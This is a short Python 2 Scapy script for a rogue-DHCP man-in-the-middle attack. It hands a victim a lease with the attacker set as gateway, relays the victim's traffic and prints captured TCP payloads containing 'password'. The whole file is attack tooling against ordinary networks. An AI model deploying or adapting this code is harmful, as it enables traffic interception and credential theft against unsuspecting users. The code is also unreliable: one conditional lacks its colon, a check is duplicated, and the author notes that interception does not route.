from scapy.all import *

# DHCP MITM
# Act as a DHCP and MITM traffic
# Edward Mead
# @TODO fix intercept, shit not routing

# Options
listen_int="en4"
gateway_ip="10.80.100.254"
gateway_mac="00:0d:28:27:23:ff" #@TODO use arp
attacker_ip=""
attacker_mac=""
victim_ip="10.80.100.231"
victim_subnet="255.255.255.0"
victim_broadcast="10.80.100.255"
victim_mac="00:00:00:00:00:00"

# iterate interface list looking for the one specified in options
for i in get_if_list():
    if (i == listen_int):
        try:
            print "Interface: " + str(i)
            attacker_mac=get_if_hwaddr(i)
            attacker_ip=get_if_addr(i)
            print "Using IP: " + attacker_ip
            print "Using MAC: " + attacker_mac
        except:
            print "Failed to read interface: " + str(i)


# check dhcp packets
def parse_dhcp(packet):
    # check packet for dhcp offer
    print "Parsing packet."
    if packet[DHCP]:

        # Construct packet.
        print "Saw DHCP packet."
        eth=Ether(src=attacker_mac,dst="FF:FF:FF:FF:FF:FF")
        ip=IP(src=attacker_ip,dst="255.255.255.255")
        udp=UDP(sport=67,dport=68)
        bootp=BOOTP(op=2,yiaddr=victim_ip,siaddr=attacker_ip,giaddr=attacker_ip,chaddr=packet[BOOTP].chaddr,xid=packet[BOOTP].xid)
        packet[0].show()
        bootp.show()

        # Discover
        if packet[DHCP].options[0][1] == 1:
            print "Saw DHCP Discover... Emulating Server"
            print "Packet src: " +  str(packet[0].src)
            victim_mac=packet[0].src
            # Offer
            dhcp=DHCP(options=[('message-type','offer')])/ DHCP(options=[('subnet_mask',victim_subnet)])/ DHCP(options=[('name_server',"8.8.8.8")]) /DHCP(options=[('router',attacker_ip)])/ DHCP(options=[('server_id',attacker_ip),('end')])
            sendp(eth/ip/udp/bootp/dhcp)
            print "Offering " + victim_ip

        #Response
        if packet[DHCP].options[0][1] == 3:
            print "Saw DHCP Response..."
            # Acknowledge
            dhcp=DHCP(options=[('message-type','ack')])/ DHCP(options=[('subnet_mask',victim_subnet)])/ DHCP(options=[('name_server',"8.8.8.8")]) /DHCP(options=[('router',attacker_ip)])/ DHCP(options=[('server_id',attacker_ip),('end')])
            sendp(eth/ip/udp/bootp/dhcp)
            print "Acknowledging " + victim_ip


def intercept(packet):
    if packet.haslayer(IP):

        # ignore broadcasts
        if packet[IP].dst == victim_broadcast
            return

        # ignore packets not related to us or our victim
        if packet[0].src != victim_mac and packet[0].src != victim_mac and packet[0].dst != attacker_mac:
            return

        # Victim -> Attacker -> Gateway
        if packet[0].src == victim_mac:
            print "Intercepted send from " + str(packet[IP].src) + " going to " + str(packet[IP].dst)
            eth=Ether(src=attacker_mac,dst=gateway_mac)
            ip=IP(src=attacker_ip,dst=packet[IP].dst)
            packet[IP]=ip
            packet[0]=eth
            sendp(packet)
            print "Sending from " + str(packet[IP].src) + " going to " + str(packet[IP].dst)
            print "Sending from " + str(packet[0].src) + " going to " + str(packet[0].dst)
            if packet.haslayer(TCP) and "password" in packet.payload[TCP]: # stupid way to find passwords
                print "Password found: " + str(packet[TCP].payload)

        # Gateway -> Attacker -> Victim
        elif packet[0].src != victim_mac:
            print "Intercepted recv from " + str(packet[IP].src) + " going to " + str(packet[IP].dst)
            eth=Ether(src=attacker_mac,dst=victim_mac)
            ip=IP(src=packet[IP].src,dst=victim_ip)
            packet[IP]=ip
            packet[0]=eth
            sendp(packet)
            print "Sending from " + str(packet[IP].src) + " going to " + str(packet[IP].dst)
            print "Sending from " + str(packet[0].src) + " going to " + str(packet[0].dst)

# Run DHCP
def run():
    sniff(iface=listen_int, filter="port 68 and port 67", prn=parse_dhcp)

# Run Intercept
def run_intercept():
    sniff(iface=listen_int, filter="", prn=intercept)


thread.start_new_thread(run,())
run_intercept()
